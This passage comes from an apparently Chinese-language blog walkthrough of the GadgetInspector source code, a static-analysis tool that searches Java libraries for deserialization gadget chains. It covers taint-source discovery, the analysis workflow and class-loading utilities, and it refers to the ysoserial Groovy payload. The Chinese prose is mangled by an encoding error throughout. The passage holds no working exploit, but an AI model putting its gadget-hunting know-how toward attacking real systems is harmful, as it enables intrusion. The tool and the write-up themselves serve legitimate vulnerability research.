addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•ï¼Œå’Œä¸Šé¢çš„ç±»ä¼¼ï¼ˆå¯ä»¥åˆå¹¶ï¼‰</span></span><br><span class="line">        <span class="comment">// Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the</span></span><br><span class="line">        <span class="comment">// args are tainted.</span></span><br><span class="line">        <span class="comment">// https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨æ¯”è¾ƒå™¨ä»£ç†ï¼Œå¯ä»¥è·³è½¬åˆ°ä»»ä½• groovy Closure çš„ call()/doCall() æ–¹æ³•ï¼Œæ‰€æœ‰çš„å‚æ•°éƒ½è¢«æ±¡æŸ“</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;groovy/lang/Closure&quot;</span>))</span><br><span class="line">                    &amp;&amp; (method.getName().equals(<span class="string">&quot;call&quot;</span>) || method.getName().equals(<span class="string">&quot;doCall&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                Type[] methodArgs = Type.getArgumentTypes(method.getDesc());</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methodArgs.length; i++) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, i + <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SourceDiscovery</span> <span class="variable">sourceDiscovery</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleSourceDiscovery</span>();</span><br><span class="line">        sourceDiscovery.discover();</span><br><span class="line">        sourceDiscovery.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-å·¥ä½œæµç¨‹"><a href="#0x03-å·¥ä½œæµç¨‹" class="headerlink" title="0x03 å·¥ä½œæµç¨‹"></a>0x03 å·¥ä½œæµç¨‹</h1><ol><li>å‡†å¤‡å·¥ä½œ<ul><li>é…ç½® log4j å‘æ§åˆ¶å°è¾“å‡ºæ—¥å¿—</li><li>é…ç½® config ä¸ºé»˜è®¤å€¼ jserialï¼ˆJava ååºåˆ—åŒ–ï¼‰</li><li>æ¥å—å‚æ•°ï¼š<code>--resume</code> ä¿ç•™ .dat æ–‡ä»¶ã€<code>--config</code> æŒ‡å®šåˆ†æç±»å‹</li><li>æ ¹æ®å‚æ•°è¯»å– war&#x2F;jar åŒ…è·¯å¾„ï¼Œè¿”å› URLClassLoader</li><li>åˆå§‹åŒ–ç±»æšä¸¾åŠ è½½å™¨ ClassResourceEnumerator</li></ul></li><li>MethodDiscoveryï¼šç±»ä¿¡æ¯ã€æ–¹æ³•ä¿¡æ¯ã€ç»§æ‰¿ä¿¡æ¯<ul><li>classes.datï¼šç±»åã€çˆ¶ç±»åã€ç±»æ¥å£åã€æ˜¯å¦ä¸ºæ¥å£ã€ç±»çš„æ‰€æœ‰å­—æ®µï¼ˆæˆå‘˜ï¼‰</li><li>methods.datï¼šç±»åã€æ–¹æ³•åã€æè¿°ç¬¦ã€æ˜¯å¦ä¸ºé™æ€æ–¹æ³•</li><li>inheritanceMap.datï¼šç±»åã€çˆ¶ç±»&#x2F;è¶…ç±»&#x2F;æ¥å£ç±»ï¼ˆç›´æ¥&#x2F;é—´æ¥çˆ¶ç±»ï¼‰</li></ul></li><li>PassthroughDiscoveryï¼šæ•°æ®æµä¿¡æ¯ï¼Œå³æ–¹æ³•å‚æ•°æ˜¯å¦èƒ½å¤Ÿå½±å“å…¶è¿”å›å€¼<ul><li>å¦‚æœå­˜åœ¨æ–¹æ³•å°†å‚æ•°ä¼ é€’ç»™è¢«è°ƒæ–¹æ³•æ—¶ï¼Œéœ€è¦å…ˆåˆ¤æ–­è¢«è°ƒæ–¹æ³•è¿”å›å€¼ä¸è¢«è°ƒæ–¹æ³•å‚æ•°çš„å…³ç³»ã€‚</li><li>passthrough.datï¼šç±»åã€æ–¹æ³•åã€æ–¹æ³•æè¿°ç¬¦ã€æ±¡ç‚¹å‚æ•°ç´¢å¼•</li></ul></li><li>CallGraphDiscoveryï¼šæ–¹æ³•è°ƒç”¨å…³ç³»ä¿¡æ¯<ul><li>callgraph.datï¼šæ–¹æ³•æ‰€å±ç±»åï¼Œæ–¹æ³•åï¼Œæ–¹æ³•æè¿°ç¬¦ï¼Œè¢«è°ƒæ–¹æ³•æ‰€å±ç±»åï¼Œè¢«è°ƒæ–¹æ³•åï¼Œè¢«è°ƒæ–¹æ³•æè¿°ï¼Œæ–¹æ³•å‚æ•°ç´¢å¼•ï¼Œæ–¹æ³•å‚æ•°å¯¹è±¡çš„å­—æ®µåç§°ï¼Œè¢«è°ƒæ–¹æ³•å‚æ•°ç´¢å¼•</li></ul></li><li>SourceDiscoveryï¼šæŸ¥æ‰¾æ±¡ç‚¹æº<ul><li>sources.datï¼šç±»åï¼Œæ–¹æ³•åï¼Œæè¿°ç¬¦ï¼Œå‚æ•°ç´¢å¼•</li></ul></li><li>GadgetChainDiscoveryï¼šé‡å†™ä¿¡æ¯ã€åˆ©ç”¨é“¾ä¿¡æ¯<ul><li>methodimpl.datï¼šç±»åï¼Œæ–¹æ³•åï¼Œæè¿°ç¬¦</li><li>gadget-chains.txtï¼šç±»å.æ–¹æ³•åæè¿°ç¬¦ (å‚æ•°ç´¢å¼•)</li></ul></li></ol><h2 id="1-Util"><a href="#1-Util" class="headerlink" title="1. Util"></a>1. Util</h2><p>æ ¹æ® java åŒ…è·¯å¾„åˆ—è¡¨è¿”å› URLClassLoaderï¼Œåç»­ç”¨äºè¯»å–ç›¸åº”çš„ java åŒ…ï¼ˆwarã€jarï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Util</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LoggerFactory.getLogger(Util.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ ¹æ® war åŒ…è·¯å¾„åˆ—è¡¨ï¼Œæ„é€ å¹¶è¿”å› URLClassLoader</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> warPath åŒ…è·¯å¾„åˆ—è¡¨</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title function_">getWarClassLoader</span><span class="params">(Path warPath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸´æ—¶æ–‡ä»¶å¤¹</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Path</span> <span class="variable">tmpDir</span> <span class="operator">=</span> Files.createTempDirectory(<span class="string">&quot;exploded-war&quot;</span>);</span><br><span class="line">        <span class="comment">// Delete the temp directory at shutdown</span></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                deleteDirectory(tmpDir);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error cleaning up temp directory &quot;</span> + tmpDir.toString(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¤åˆ¶åˆ°ä¸´æ—¶æ–‡ä»¶å¤¹</span></span><br><span class="line">        <span class="comment">// Extract to war to the temp directory</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">JarInputStream</span> <span class="variable">jarInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarInputStream</span>(Files.newInputStream(warPath))) &#123;</span><br><span class="line">            JarEntry jarEntry;</span><br><span class="line">            <span class="keyword">while</span> ((jarEntry = jarInputStream.getNextJarEntry()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Path</span> <span class="variable">fullPath</span> <span class="operator">=</span> tmpDir.resolve(jarEntry.getName());</span><br><span class="line">                <span class="keyword">if</span> (!jarEntry.isDirectory()) &#123;</span><br><span class="line">                    <span class="type">Path</span> <span class="variable">dirName</span> <span class="operator">=</span> fullPath.getParent();</span><br><span class="line">                    <span class="keyword">if</span> (dirName == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parent of item is outside temp directory.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!Files.exists(dirName)) &#123;</span><br><span class="line">                        Files.createDirectories(dirName);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> Files.newOutputStream(fullPath)) &#123;</span><br><span class="line">                        copy(jarInputStream, outputStream);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å­˜å‚¨åŒ…è·¯å¾„</span></span><br><span class="line">        <span class="keyword">final</span> List&lt;URL&gt; classPathUrls = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        classPathUrls.add(tmpDir.resolve(<span class="string">&quot;WEB-INF/classes&quot;</span>).toUri().toURL());</span><br><span class="line">        Files.list(tmpDir.resolve(<span class="string">&quot;WEB-INF/lib&quot;</span>)).forEach(p -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                classPathUrls.add(p.toUri().toURL());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(classPathUrls.toArray(<span class="keyword">new</span> <span class="title class_">URL</span>[classPathUrls.size()]));</span><br><span class="line">        <span class="keyword">return</span> classLoader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ ¹æ® jar åŒ…è·¯å¾„åˆ—è¡¨ï¼Œæ„é€ å¹¶è¿”å› URLClassLoader</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jarPaths åŒ…è·¯å¾„åˆ—è¡¨</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title function_">getJarClassLoader</span><span class="params">(Path... jarPaths)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// å­˜å‚¨åŒ…è·¯å¾„</span></span><br><span class="line">        <span class="keyword">final</span> List&lt;URL&gt; classPathUrls = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(jarPaths.length);</span><br><span class="line">        <span class="comment">// éå†åŒ…è·¯å¾„åˆ—è¡¨</span></span><br><span class="line">        <span class="keyword">for</span> (Path jarPath : jarPaths) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!Files.exists(jarPath) || Files.isDirectory(jarPath)) &#123; <span class="comment">// æŸ¥æ‰¾æ–‡ä»¶</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Path \&quot;&quot;</span> + jarPath + <span class="string">&quot;\&quot; is not a path to a file.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            classPathUrls.add(jarPath.toUri().toURL()); <span class="comment">//</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(classPathUrls.toArray(<span class="keyword">new</span> <span class="title class_">URL</span>[classPathUrls.size()]));</span><br><span class="line">        <span class="keyword">return</span> classLoader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Recursively delete the directory root and all its contents</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> root Root directory to be deleted</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deleteDirectory</span><span class="params">(Path root)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Files.walkFileTree(root, <span class="keyword">new</span> <span class="title class_">SimpleFileVisitor</span>&lt;Path&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> FileVisitResult <span class="title function_">visitFile</span><span class="params">(Path file, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                Files.delete(file);</span><br><span class="line">                <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> FileVisitResult <span class="title function_">postVisitDirectory</span><span class="params">(Path dir, IOException exc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                Files.delete(dir);</span><br><span class="line">                <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Copy inputStream to outputStream. Neither stream is closed by this method.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inputStream</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> outputStream</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">copy</span><span class="params">(InputStream inputStream, OutputStream outputStream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        <span class="keyword">while</span> ((n = inputStream.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            outputStream.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ClassResourceEnumerator"><a href="#2-ClassResourceEnumerator" class="headerlink" title="2. ClassResourceEnumerator"></a>2. ClassResourceEnumerator</h2><p>å®šä¹‰ç±»èµ„æºæ¥å£ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">interface</span> <span class="title class_">ClassResource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> InputStream <span class="title function_">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException; <span class="comment">// è¯»å–æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>;    <span class="comment">// æ–‡ä»¶å</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç±»èµ„æºå…·ä½“å®ç°ï¼š</p><ul><li><code>PathClassResource</code>ï¼šç›´æ¥ä»è·¯å¾„è¯»å–ç±»æ–‡ä»¶ï¼Œç”¨äºé€šè¿‡ JRT æ–‡ä»¶ç³»ç»Ÿè¯»å–è·¯å¾„ä¸‹çš„ç±»æ–‡ä»¶ï¼ˆè¿è¡Œæ—¶ï¼‰</li><li><code>ClassLoaderClassResource</code>ï¼šä½¿ç”¨å·²æœ‰çš„ ClassLoader è¯»å–ç±»æ–‡ä»¶</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä»è·¯å¾„è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">PathClassResource</span> <span class="keyword">implements</span> <span class="title class_">ClassResource</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Path path;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">PathClassResource</span><span class="params">(Path path)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.path = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> InputStream <span class="title function_">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> Files.newInputStream(path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> path.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ ClassLoader è¯»å–ç±»æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderClassResource</span> <span class="keyword">implements</span> <span class="title class_">ClassResource</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader classLoader;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String resourceName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">ClassLoaderClassResource</span><span class="params">(ClassLoader classLoader, String resourceName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.classLoader = classLoader;</span><br><span class="line">        <span class="built_in">this</span>.resourceName = resourceName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> InputStream <span class="title function_">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> classLoader.getResourceAsStream(resourceName);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> resourceName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿”å›è¿è¡Œæ—¶çš„æ‰€æœ‰ç±»å’ŒæŒ‡å®š java åŒ…ä¸­çš„ç±»ï¼Œè¿™é‡Œçš„è¿è¡Œæ—¶ç±»æŒ‡ JDK ä¸­çš„ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¿”å› java è¿è¡Œæ—¶çš„ç±»å’ŒæŒ‡å®šçš„ java åŒ…ä¸­çš„ç±»</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Collection&lt;ClassResource&gt; <span class="title function_">getAllClasses</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// å…ˆåŠ è½½è¿è¡Œæ—¶ç±»ï¼ˆbootstrap classesï¼‰</span></span><br><span class="line">    Collection&lt;ClassResource&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(getRuntimeClasses());</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ ClassLoader åŠ è½½ç”¨æˆ·æŒ‡å®šçš„ java åŒ…</span></span><br><span class="line">    <span class="keyword">for</span> (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123;</span><br><span class="line">        result.add(<span class="keyword">new</span> <span class="title class_">ClassLoaderClassResource</span>(classLoader, classInfo.getResourceName()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¿”å›è¿è¡Œæ—¶çš„ç±»</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Collection&lt;ClassResource&gt; <span class="title function_">getRuntimeClasses</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// Java8 åŠä»¥å‰çš„è¿è¡Œæ—¶ç±»å¯ä»¥é€šè¿‡è¯»å– rt.jar æ–‡ä»¶è·å–</span></span><br><span class="line">    <span class="comment">// A hacky way to get the current JRE&#x27;s rt.jar. Depending on the class loader, rt.jar may be in the</span></span><br><span class="line">    <span class="comment">// bootstrap classloader so all the JDK classes will be excluded from classpath scanning with this!</span></span><br><span class="line">    <span class="comment">// However, this only works up to Java 8, since after that Java uses some crazy module magic.</span></span><br><span class="line">    <span class="type">URL</span> <span class="variable">stringClassUrl</span> <span class="operator">=</span> Object.class.getResource(<span class="string">&quot;String.class&quot;</span>);</span><br><span class="line">    <span class="type">URLConnection</span> <span class="variable">connection</span> <span class="operator">=</span> stringClassUrl.openConnection();</span><br><span class="line">    Collection&lt;ClassResource&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (connection <span class="keyword">instanceof</span> JarURLConnection) &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">runtimeUrl</span> <span class="operator">=</span> ((JarURLConnection) connection).getJarFileURL();</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;runtimeUrl&#125;);</span><br><span class="line">        <span class="keyword">for</span> (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ClassLoaderClassResource</span>(classLoader, classInfo.getResourceName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Java9 åŠä»¥åçš„è¿è¡Œæ—¶ç±»é€šè¿‡ JRT æ–‡ä»¶ç³»ç»Ÿè¯»å–è·¯å¾„ä¸‹çš„ç±»æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">// https://stackoverflow.com/questions/1240387/where-are-the-java-system-packages-stored/53897006#53897006</span></span><br><span class="line">    <span class="comment">// Try finding all the JDK classes using the Java9+ modules 